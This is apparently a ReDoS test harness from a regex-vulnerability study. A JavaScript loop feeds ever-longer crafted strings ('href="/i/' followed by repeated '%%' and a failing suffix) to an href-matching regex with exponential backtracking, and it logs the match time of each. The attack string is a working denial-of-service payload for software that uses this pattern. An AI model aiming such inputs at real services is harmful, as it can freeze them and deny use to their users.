/* 3279
 * href\s*=\s*\"((\/)([i])(\/)+([\w\-\.,@?^=%&amp;:/~\+#]*[\w\-\@?^=%&amp;/~\+#]+)*)\"
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"href="/i/"+"%%"*8+"! _1_EOA(i or ii)"
 */
var REGEX = new RegExp("href\s*=\s*\"((\/)([i])(\/)+([\w\-\.,@?^=%&amp;:/~\+#]*[\w\-\@?^=%&amp;/~\+#]+)*)\"")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'href=\"/i/' + '%%'.repeat(i*1) + '! _1_EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}